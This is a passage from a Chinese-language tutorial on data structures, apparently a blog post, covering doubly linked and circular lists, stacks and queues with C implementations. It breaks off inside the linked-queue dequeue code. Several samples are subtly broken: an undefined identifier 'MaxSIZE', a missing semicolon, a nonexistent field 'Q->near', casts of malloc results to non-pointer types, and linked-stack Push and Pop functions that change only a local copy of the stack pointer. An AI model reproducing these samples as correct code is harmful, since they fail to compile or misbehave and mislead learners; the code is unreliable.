<em><strong>●在插入和删除操作时，只需要修改游标，不需要移动元素，从而改进了在顺序存储结构中的插入和删除操作</strong></em></p><p><em><strong>需要移动大量元素的缺点</strong></em></p><p><em><strong>2、缺点：</strong></em></p><p>​        <em><strong>●没有解决连续存储分配带来的表长难以确定的问题</strong></em></p><p>​        <em><strong>●失去了顺序存储结构随机存取的特性</strong></em></p><h2 id="双向链表"><a class="markdownIt-Anchor" href="#双向链表"></a> 双向链表</h2><h3 id="定义-4"><a class="markdownIt-Anchor" href="#定义-4"></a> 定义</h3><p>双向链表是在单链表的每个节点中，再设置一个指向其前驱节点的指针域，前驱后继方向都能遍历；</p><h3 id="存储结构"><a class="markdownIt-Anchor" href="#存储结构"></a> 存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DulNode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DulNode</span>* <span class="title">prior</span>;</span>  <span class="comment">//直接前驱指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DulNode</span>* <span class="title">next</span>;</span>  <span class="comment">//直接后继指针</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>显然，与单链表相比，多了一个直接前驱；</p><h2 id="循环链表"><a class="markdownIt-Anchor" href="#循环链表"></a> 循环链表</h2><h3 id="定义-5"><a class="markdownIt-Anchor" href="#定义-5"></a> 定义</h3><p>循环链表——首尾相连的链表；</p><p>将单链表中终端节点的指针端由空指针改为指向头节点，就使整个单链表形成一个环。这种头尾相接的单链表称为</p><p>单循环链表，简称循环链表；</p><h3 id="特点"><a class="markdownIt-Anchor" href="#特点"></a> 特点</h3><p>循环链表中，从任一节点出发都可以访问到表中所有节点，在单链表中，必须从头指针开始，否则无法访问到该节</p><p>点之前的其他节点；</p><p>循环链表好像用处不太大，就不多说了；</p><h2 id="小结-2"><a class="markdownIt-Anchor" href="#小结-2"></a> 小结</h2><p>这一章节是线性表，线性表对于以后学习的数据结构会有很大作用；选择使用哪种线性表，结合情况再定，各有利</p><p>弊；   // 下一章学习栈，不见不散；</p><p>Bye~~</p><h1 id="u栈ustack"><a class="markdownIt-Anchor" href="#u栈ustack"></a> <u>栈</u>—Stack</h1><p>线性表总的来说是挺简单的（和链表差不多），学好线性表才可以继续学习哦~</p><p>下面我们开始学习栈</p><h2 id="定义-6"><a class="markdownIt-Anchor" href="#定义-6"></a> 定义</h2><p><u>***栈是限定仅在表尾进行插入和删除操作的线性表；***</u></p><p>允许插入和删除的一端称为栈顶，另一端称为栈底，不含任何数据元素的栈称为空栈，栈又称为后进先出线性表，</p><p>简称LIFO结构；</p><h2 id="栈的抽象数据类型基本操作-入栈-出栈"><a class="markdownIt-Anchor" href="#栈的抽象数据类型基本操作-入栈-出栈"></a> 栈的抽象数据类型——基本操作( 入栈 出栈 )</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、InitStack(*S) <span class="comment">//初始化操作，建立一个空栈</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、DestroyStack(*S) <span class="comment">//若栈存在，则销毁它</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、ClearStack(*S) <span class="comment">//将栈清空</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、StackEmpty(*S) <span class="comment">//若栈为空，返回true，否则返回false</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、GetTop(S, *e) <span class="comment">//若栈存在且非空，用e返回S的栈顶元素</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、Push(*S, e) <span class="comment">//若栈S存在，插入新元素e到栈S中并成为栈顶元素</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、Pop(*S, *e) <span class="comment">//删除栈S中栈顶元素，并用e返回其值</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、StackLength(S) <span class="comment">//返回栈S的元素个数</span></span><br></pre></td></tr></tbody></table></figure><h2 id="栈的顺序存储结构"><a class="markdownIt-Anchor" href="#栈的顺序存储结构"></a> 栈的顺序存储结构</h2><h3 id="结构代码"><a class="markdownIt-Anchor" href="#结构代码"></a> 结构代码</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data[MAXSIZE]; <span class="comment">//栈的元素最大个数</span></span><br><span class="line"><span class="keyword">int</span> top; <span class="comment">//用于栈顶指针</span></span><br><span class="line">}SqStack;</span><br></pre></td></tr></tbody></table></figure><h3 id="初始化栈"><a class="markdownIt-Anchor" href="#初始化栈"></a> 初始化栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(SqStack* S)</span> <span class="comment">//初始化栈</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">S-&gt;top = <span class="number">-1</span>; <span class="comment">//初始化栈为空</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="判断栈是否已满"><a class="markdownIt-Anchor" href="#判断栈是否已满"></a> 判断栈是否已满</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackFull</span><span class="params">(SqStack* S)</span> <span class="comment">//判断栈是否已满</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top == MaxSIZE - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="判断栈是否为空"><a class="markdownIt-Anchor" href="#判断栈是否为空"></a> 判断栈是否为空</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackEmpty</span><span class="params">(SqStack* S)</span> <span class="comment">//判断栈是否为空</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="进栈"><a class="markdownIt-Anchor" href="#进栈"></a> 进栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Push</span><span class="params">(SqStack* S, DataType e)</span> <span class="comment">//进栈操作 插入元素e为新的栈顶元素</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (StackFull(S)) <span class="comment">//栈满</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">S-&gt;top++; <span class="comment">//栈顶指针增加1</span></span><br><span class="line">S-&gt;data[S-&gt;top] = e; <span class="comment">//新插入元素赋值给栈顶空间</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="出栈"><a class="markdownIt-Anchor" href="#出栈"></a> 出栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pop</span><span class="params">(SqStack* S, DataType* e)</span> <span class="comment">//出栈操作 若栈不为空，则删除栈顶元素，用e返回其值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (StackEmpty(S)) <span class="comment">//栈空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = S-&gt;data[S-&gt;top]; <span class="comment">//将要删除的元素赋值给e</span></span><br><span class="line">S-&gt;top--; <span class="comment">//栈顶指针减少1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="栈的链式存储结构"><a class="markdownIt-Anchor" href="#栈的链式存储结构"></a> 栈的链式存储结构</h2><h3 id="结构代码-2"><a class="markdownIt-Anchor" href="#结构代码-2"></a> 结构代码</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span>* <span class="title">next</span>;</span></span><br><span class="line">}LinkStack;</span><br></pre></td></tr></tbody></table></figure><h3 id="初始化栈-2"><a class="markdownIt-Anchor" href="#初始化栈-2"></a> 初始化栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LinkStack* <span class="title">InitStack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkStack* S;</span><br><span class="line">S = <span class="literal">NULL</span>; <span class="comment">//初始化栈为空</span></span><br><span class="line"><span class="keyword">return</span> S;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="判断栈是否为空-2"><a class="markdownIt-Anchor" href="#判断栈是否为空-2"></a> 判断栈是否为空</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EmptyStack</span><span class="params">(LinkStack* S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (S == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="进栈-2"><a class="markdownIt-Anchor" href="#进栈-2"></a> 进栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Push</span><span class="params">(LinkStack* S, DataType e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkStack* p = (LinkStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkStack));</span><br><span class="line">p-&gt;data = e; <span class="comment">//e放入新节点的数据域</span></span><br><span class="line">p-&gt;next = S; <span class="comment">//新节点插入链表表头之前</span></span><br><span class="line">S = p; <span class="comment">//新节点作为栈顶</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="出栈-2"><a class="markdownIt-Anchor" href="#出栈-2"></a> 出栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pop</span><span class="params">(LinkStack* S, DataType* e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkStack* p;</span><br><span class="line"><span class="keyword">if</span> (EmptyStack(S))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = S-&gt;data; <span class="comment">//栈顶元素赋值给e</span></span><br><span class="line">p = S; <span class="comment">//p节点指向原栈顶S</span></span><br><span class="line">S = S-&gt;next; <span class="comment">//原栈顶S指向其下一个节点</span></span><br><span class="line"><span class="built_in">free</span>(p); <span class="comment">//释放原栈顶空间</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="取栈顶元素"><a class="markdownIt-Anchor" href="#取栈顶元素"></a> 取栈顶元素</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetTop</span><span class="params">(LinkStack* S, DataType* e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (EmptyStack(S)) <span class="comment">//栈为空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = S-&gt;data; <span class="comment">//栈顶元素赋给变量e</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="遍历栈"><a class="markdownIt-Anchor" href="#遍历栈"></a> 遍历栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowStack</span><span class="params">(LinkStack* S)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkStack* p = S;</span><br><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"栈为空\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, p-&gt;data);</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="小结-3"><a class="markdownIt-Anchor" href="#小结-3"></a> 小结</h2><p>栈相对来说就是比较特殊的线性表罢了，接下来要学习的队列，也是一种特殊的线性表；让我们拭目以待 // Bye~</p><h1 id="队列queue"><a class="markdownIt-Anchor" href="#队列queue"></a> 队列—Queue</h1><h2 id="定义-7"><a class="markdownIt-Anchor" href="#定义-7"></a> 定义</h2><p><u>***队列是只允许在一端进行插入操作，在另一端进行删除操作的线性表；***</u></p><p>队列是一种先进先出的线性表，简称FIFO；允许插入的一端称为队尾，允许删除的一端称为队头；</p><h2 id="队列的抽象数据类型基本操作"><a class="markdownIt-Anchor" href="#队列的抽象数据类型基本操作"></a> 队列的抽象数据类型——基本操作</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、InitQueue(*Q) <span class="comment">//初始化操作，建立一个空队列</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>、DestroyQueue(*Q) <span class="comment">//若队列Q存在，则销毁</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>、ClearQueue(*Q) <span class="comment">//将队列Q清空</span></span><br><span class="line">    </span><br><span class="line"><span class="number">4</span>、QueueEmpty(Q) <span class="comment">//若队列为空，返回true，否则返回false</span></span><br><span class="line">    </span><br><span class="line"><span class="number">5</span>、GetHead(Q,*e) <span class="comment">//若队列存在且非空，用e返回Q的队头元素</span></span><br><span class="line">    </span><br><span class="line"><span class="number">6</span>、EnQueu(*Q,e) <span class="comment">//若队列存在，则插入e于Q，并成为队尾元素</span></span><br><span class="line">    </span><br><span class="line"><span class="number">7</span>、DeQueue(*Q,*e) <span class="comment">// 删除队列Q中队头元素，并用e返回其值</span></span><br><span class="line">    </span><br><span class="line"><span class="number">8</span>、QueueLength(Q) <span class="comment">//返回队列Q中元素个数</span></span><br></pre></td></tr></tbody></table></figure><h2 id="循环队列"><a class="markdownIt-Anchor" href="#循环队列"></a> 循环队列</h2><h3 id="队列顺序存储的不足"><a class="markdownIt-Anchor" href="#队列顺序存储的不足"></a> 队列顺序存储的不足</h3><p>与栈不同的是，队列的出列是在队头，那就意味着，队列的所有元素都得移动，以保证下标为0的位置不为空，此</p><p>时间复杂度为O(n);</p><p>为了避免当只有一个元素时，队头和队尾重合使处理变得麻烦，所以引入两个指针，front指针指向队头元素，</p><p>rear指针指向队尾元素的下一个位置，这样当front等于rear时，此队列不是还剩一个元素，而是空队列；</p><p>假溢出：说白了就是数组末尾元素已满，再向后加就越界，而队列前面还有空位的现象（0,1,2…空着）；</p><h3 id="循环队列定义"><a class="markdownIt-Anchor" href="#循环队列定义"></a> 循环队列定义</h3><p>头尾相接顺序存储结构称为循环队列；</p><p>设队列最大长度为QueueSize，那么：</p><p>队列满的条件为(rear+1) % QueueSize == front ;</p><p>队空条件为front == rear ;</p><p>队列长度计算公式为(rear-front+QueueSize) % QueueSize ; (自己推导式子很简单)</p><h3 id="循环队列顺序存储结构"><a class="markdownIt-Anchor" href="#循环队列顺序存储结构"></a> 循环队列顺序存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> front; <span class="comment">//头指针</span></span><br><span class="line"><span class="keyword">int</span> rear; <span class="comment">//尾指针，若队列不变，指向队列尾元素的下一个位置</span></span><br><span class="line">}SqQueue;</span><br></pre></td></tr></tbody></table></figure><h3 id="队列初始化"><a class="markdownIt-Anchor" href="#队列初始化"></a> 队列初始化</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitQueue</span><span class="params">(SqQueue *Q)</span> <span class="comment">//初始化一个对列</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">Q-&gt;front = <span class="number">0</span>;</span><br><span class="line">Q-&gt;rear = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="队列长度"><a class="markdownIt-Anchor" href="#队列长度"></a> 队列长度</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueLength</span><span class="params">(SqQueue Q)</span> <span class="comment">//求队列长度</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> (Q.rear - Q.front + MAXSIZE) % MAXSIZE;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="入队"><a class="markdownIt-Anchor" href="#入队"></a> 入队</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnQueue</span><span class="params">(SqQueue* Q, DataType e)</span> <span class="comment">//若队列未满则e入列</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> ((Q-&gt;rear + <span class="number">1</span>) % MAXSIZE == Q-&gt;front) <span class="comment">//队列已满</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">Q-&gt;data[Q-&gt;rear] = e; <span class="comment">//e赋值给队尾</span></span><br><span class="line">Q-&gt;rear = (Q-&gt;rear + <span class="number">1</span>) % MAXSIZE; <span class="comment">//rear指针后移一个位置，若到最后则转到数组头部</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="出队"><a class="markdownIt-Anchor" href="#出队"></a> 出队</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DeQueue</span><span class="params">(SqQueue* Q, DataType* e)</span> <span class="comment">//若队列不空则删除队头，并用e返回其值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;near) <span class="comment">//队列为空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = Q-&gt;data[Q-&gt;front]; <span class="comment">//将队头元素赋值给e</span></span><br><span class="line">Q-&gt;front = (Q-&gt;front + <span class="number">1</span>) % MAXSIZE; <span class="comment">//front指针向后移一位置，若到最后则转到数组头部</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="队列的链式存储结构及实现"><a class="markdownIt-Anchor" href="#队列的链式存储结构及实现"></a> 队列的链式存储结构及实现</h2><p>队列的链式存储结构，其实就是线性表的单链表，只不过它只能尾进头出而已，我们把它简称为链队列；</p><h3 id="链式队列存储结构"><a class="markdownIt-Anchor" href="#链式队列存储结构"></a> 链式队列存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">qnode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data; <span class="comment">//节点的数据域</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">qnode</span>* <span class="title">next</span>;</span> <span class="comment">//节点的指针域</span></span><br><span class="line">}LinkListQ;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">LinkListQ* front, * rear; <span class="comment">//队列的队头和队尾指针</span></span><br><span class="line">}LinkQueue;</span><br></pre></td></tr></tbody></table></figure><h3 id="队列初始化-2"><a class="markdownIt-Anchor" href="#队列初始化-2"></a> 队列初始化</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LinkQueue* <span class="title">InitQueue</span><span class="params">()</span> <span class="comment">//队列初始化</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkQueue* Q;</span><br><span class="line">LinkListQ* p;</span><br><span class="line">Q = (LinkQueue*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkQueue)); <span class="comment">//头指针所指节点</span></span><br><span class="line">p = (LinkListQ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkListQ)); <span class="comment">//头节点</span></span><br><span class="line">Q-&gt;front = p; <span class="comment">//Q指针所指的front指针指向p</span></span><br><span class="line">Q-&gt;rear = p; <span class="comment">//Q指针所指的rear指针指向p</span></span><br><span class="line"><span class="keyword">return</span> Q;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="入队-2"><a class="markdownIt-Anchor" href="#入队-2"></a> 入队</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnQueue</span><span class="params">(LinkQueue* Q, DataType e)</span> <span class="comment">//插入e于队尾</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkListQ* s;</span><br><span class="line">s = (LinkListQ)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkListQ)); <span class="comment">//分配内存空间</span></span><br><span class="line">s-&gt;data = e; <span class="comment">//将e存入新节点的数据域</span></span><br><span class="line">s-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">Q-&gt;rear-&gt;next = s; <span class="comment">//将新节点插入链队之后</span></span><br><span class="line">Q-&gt;rear = s; <span class="comment">//队尾指针指向队尾元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="出队-2"><a class="markdownIt-Anchor" href="#出队-2"></a> 出队</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> 